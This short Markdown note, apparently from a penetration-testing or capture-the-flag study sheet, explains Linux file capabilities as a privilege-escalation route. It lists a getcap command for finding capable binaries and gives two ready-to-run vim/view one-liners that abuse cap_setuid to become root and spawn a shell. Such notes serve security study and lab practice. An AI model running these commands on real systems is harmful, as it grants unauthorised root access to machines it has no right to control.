# Capabilities
***
System administrators have an additional method at their disposal to elevate the privilege level of a process or executable, known as "capabilities." To view the capabilities associated with binaries, follow these steps.
```sh
getcap -r / 2>/dev/null
```

## Example
Notice in the image below that both "vim" and "view" possess the "cap_setuid" capability, which could potentially enable an attacker to escalate their privileges.

```sh
# vim
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# view
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
